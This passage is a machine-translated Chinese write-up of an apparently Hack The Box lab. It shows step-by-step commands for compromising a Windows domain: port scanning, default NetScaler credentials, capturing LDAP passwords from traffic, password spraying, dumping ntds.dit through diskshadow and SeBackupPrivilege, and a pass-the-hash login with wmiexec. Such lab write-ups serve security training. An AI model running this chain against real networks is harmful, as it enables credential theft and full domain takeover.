<img src="https://habrastorage.org/webt/0v/08/p9/0v08p94zn_xex3wgqvqh55ahqyy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
由于我拥有Linux，因此与常规SSH客户端一起使用会更加方便。</font><font style="vertical-align: inherit;">将密钥重新格式化为这种格式。</font></font><br>
<br>
<pre><code class="bash hljs">sudo apt install putty-tools<font></font>
puttygen private.ppk -O private-openssh -o id_rsa</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在我们决定可以和他在一起。</font><font style="vertical-align: inherit;">为此，请扫描内部网络以找到打开的端口22。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains nmap -p22 172.16.249.200-205 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/fq/da/78/fqda78yhbo1nuezb5_txvnxvigg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们找到了，但是我们仍然对该主机一无所知。尝试不使用名称进行连接时，我们会收到一条有趣的消息和一个密码请求。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sf/gp/qs/sfgpqst6ffsugdv0biquhni5fea.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
检查我们知道的用户名并没有带来结果。使用脚本扫描此服务的nmap也不会产生任何结果。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sd/wi/y0/sdwiy0egqd4zgm4fagjeyizfmv4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
然后，我扫描了主机上的所有端口。但是他没有等到扫描结束，因为它花费了很长时间，因为在代理链中，人们可以观察端口是否可用。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/yv/9e/ov/yv9eovdujflhzyyf9q-hsg7uphw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
由于端口80可用，因此我在浏览器中安装了代理，然后去看那里。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/v2/e6/v-/v2e6v-zekaxpfyu5pvagxkayeta.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Citrix NetScaler授权页面将满足我们的要求。 Google将我们带到文档中，在该文档中我们可以识别默认登录名。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mh/cp/ha/mhcpha-tvjml8kvelevudpehacs.png"><br>
<br>
<img src="https://habrastorage.org/webt/u4/rg/zi/u4rgziapmiadlxkt9v-cnydmizo.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并使用此登录名，通过SSH成功​​连接。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u2/kl/5b/u2kl5b92xjdgz1gfigbyvb8jgfs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在服务器上四处走动之后，我研究了有关攻击此类设备的材料，其中一种是流量监控。</font><font style="vertical-align: inherit;">因此，我使tcpdump处于活动状态一段时间，并收到了流量转储。</font></font><br>
<br>
<pre><code class="bash hljs">tcpdump -s0 -w r.pcap</code></pre><br>
<img src="https://habrastorage.org/webt/ur/9p/pf/ur9ppf0umalf7govd7ao_jjzc-q.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在下载此文件。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains scp -i id_rsa nsroot@172.16.249.202:/root/r.pcap ./</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
为了快速找到凭据，我们使用</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PCredz</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/0c/lq/yn/0clqyngcfi_fxwg1onbheg9t6au.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们得到另一个标志。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ub/ws/mx/ubwsmxhyscpsrfy7jumcjf689la.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多贝冈旗</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是此程序根本不执行，因此您需要分析转储中是否存在各种机密或令牌。</font><font style="vertical-align: inherit;">在按协议对数据包进行排序之后，我们进入LDAP并找到具有密码的两个用户的bindRequest（我们已经找到了一个）。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/il/ad/7_/ilad7_p_f-rbgwdrpglcejkbh74.png"><br>
<br>
<img src="https://habrastorage.org/webt/_6/w_/al/_6w_al3oddm4ikipiqi3ishgado.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
验证此用户的密码。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains cme smb -u <span class="hljs-string">"netscaler-svc"</span> -p <span class="hljs-string">"#S3rvice#@cc"</span> -d htb.local 172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/n_/7x/r4/n_7xr4urfsbuwry9m258zxmiczy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
该用户并不引人注目，只是他是该服务的用户。</font><font style="vertical-align: inherit;">通常，此类用户的密码与域中其他用户的密码一致。</font><font style="vertical-align: inherit;">让我们检查哪些其他用户将使用此密码。</font><font style="vertical-align: inherit;">我使用metasploit做到了这一点。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains msfconsole 2&gt;/dev/null<font></font>
&gt; use auxiliary/scanner/smb/smb_login<font></font>
&gt; <span class="hljs-built_in">set</span> SMBDomain htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> RHOSTS 172.16.249.200<font></font>
&gt; <span class="hljs-built_in">set</span> USER_FILE ~/tmp/users.txt<font></font>
&gt; <span class="hljs-built_in">set</span> PASS_FILE ~/tmp/passwords.txt<font></font>
&gt; <span class="hljs-built_in">set</span> VERBOSE <span class="hljs-literal">false</span>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/8l/d5/gj/8ld5gjri_mmvptxg1-cdlzc9f1e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并且此密码已进入所有服务帐户。</font><font style="vertical-align: inherit;">正如我们先前所发现的，backup-svc帐户具有特权，这意味着它被允许登录到域控制器。</font><font style="vertical-align: inherit;">检查RDP（3389）和WinRM（5985）服务的开放端口。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains nmap -p 3389,5985 172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/pz/cw/5a/pzcw5asa6eqyodh4sfwa6vc9_ys.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
两种登录方法都可以，但是我更喜欢WinRM。</font><font style="vertical-align: inherit;">使用Evil-WinRM程序登录。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains evil-winrm -i 172.16.249.200 -u backup-svc -p <span class="hljs-string">"#S3rvice#@cc"</span> 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/lq/nx/rg/lqnxrg12wpdnbcsr9fuapynu38u.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并采取另一个标志。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5c/eu/xx/5ceuxxnpsuj3orc_35qazfwnkq0.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拥有的旗帜</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
查看有关该用户的信息后，我们可以看到该用户在特权组中的成员身份，以便我们可以复制ntds.dit文件并提取域用户的凭据。</font></font><br>
<br>
<pre><code class="bash hljs">whoami /all</code></pre><br>
<img src="https://habrastorage.org/webt/in/4i/a6/in4ia6lepmr0u2_voqct6h-qjw8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
在ntds文件的转储方法中，discshadow选项已成功执行。</font><font style="vertical-align: inherit;">让我们使用RDP登录。</font><font style="vertical-align: inherit;">作为客户，我使用remmina。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains remmina</code></pre><br>
<img src="https://habrastorage.org/webt/1b/bv/os/1bbvosxjg1jb6y7acri98kmj47k.png"><br>
<br>
<img src="https://habrastorage.org/webt/so/ec/79/soec79bjwbiktiqfc9udby8v4g0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
命令提示符窗口会打招呼。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/xl/ox/kr/xloxkreweosxvmhp56wiy4v4hms.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
让我们进入diskshadow的上下文。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/nw/uh/ub/nwuhub-n7hnrfsm9q505cyrvrt4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并创建一个副本-驱动器Z。</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-built_in">set</span> context persistence nowriters<font></font>
add volume c: <span class="hljs-built_in">alias</span> sss<font></font>
create <font></font>
expose %sss% z:</code></pre><br>
<img src="https://habrastorage.org/webt/ow/hv/xx/owhvxxddfioicyx-kn1frars-hs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
检查并查看ntds.dit文件的副本。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/hp/vo/ei/hpvoeilgbsxim5ljt3nxflbmo6w.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
我们还需要一个系统文件来解密ntds数据库，但是更容易获得它。</font></font><br>
<br>
<pre><code class="bash hljs">reg.exe save hklm\system C:\Users\backup-svc\Documents\system.bak</code></pre><br>
<img src="https://habrastorage.org/webt/nz/_z/16/nz_z16rrzirc0l4udjlgvny5zvm.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但这还不是全部，因为仅是您无法复制ntds文件。</font><font style="vertical-align: inherit;">为此，请使用</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下工具</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">首先，在主机上加载两个DLL。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/z9/jb/d1/z9jbd1lsunkcyd3uon6v8yl3skw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并加载到内存中。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/9q/gk/cj/9qgkcjotiqguv2rhtjbci6ey1-0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，我们激活特权并验证它是否处于“启用”状态。</font></font><br>
<br>
<pre><code class="bash hljs">Set-SeBackupPrivilege<font></font>
Whoami /priv | findstr Backup</code></pre><br>
<img src="https://habrastorage.org/webt/uu/bt/gt/uubtgtsp7zzfuvc9jyi-371bte8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
好的，现在复制文件。</font></font><br>
<br>
<pre><code class="bash hljs">Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\Users\backup-svc\Documents\ntds.dit</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
现在，我们将ntds和系统文件下载到本地主机（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">那时实验室关闭，我在下载文件的同时就失去了访问权限……事实证明，该实验室仅对具有订阅资格的用户可用（已进行重新解析），我无法完成整个过程！但是，非常感谢@kemstat在VIP期间共享了VPN配置，以便我可以完成本文</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">让我们获取凭据。</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py -ntds ndts.dit -system system.bak LOCAL</code></pre><br>
<img src="https://habrastorage.org/webt/pk/jc/vt/pkjcvt3bnlmlqet3kcbewyy72ks.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
并且有一个管理员哈希。</font><font style="vertical-align: inherit;">现在使用PTH攻击连接到服务器。</font><font style="vertical-align: inherit;">但是psexec（通过SMB连接）阻止我们读取文件。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/c8/wp/tzc8wpvaac_btlyw3sq5mie2b1y.png"><br>
<br>
<img src="https://habrastorage.org/webt/-_/mq/jj/-_mqjjz_ybfor9th1np8b6liibs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
但是WMI给了我们无限的访问权限，我们获得了域管理员的特权和最后一个标志。</font></font><br>
<br>
<pre><code class="bash hljs">proxychains wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be Administrator@172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/ba/y_/sd/bay_sddavamcgwmwy2hj-i819eg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
就这样。</font><font style="vertical-align: inherit;">作为反馈，请评论您是否从本文中学到了什么，以及它是否对您有用。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
您可以通过</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加入我们</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">在这里，您可以找到有趣的资料，合并的课程以及软件。</font><font style="vertical-align: inherit;">让我们建立一个社区，在这个社区中，会有一些精通IT领域的人，然后我们可以在任何IT和信息安全性问题上互相帮助。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN506954/index.html">关于Rails和ELK的另一篇文章</a></li>
<li><a href="../zh-CN506956/index.html">量子技术与健康</a></li>
<li><a href="../zh-CN506962/index.html">在Unity中异步/等待</a></li>
<li><a href="../zh-CN506964/index.html">Android开发：2020年5月职业评论</a></li>
<li><a href="../zh-CN506976/index.html">Solutionix D500和D700 3D扫描仪概述</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>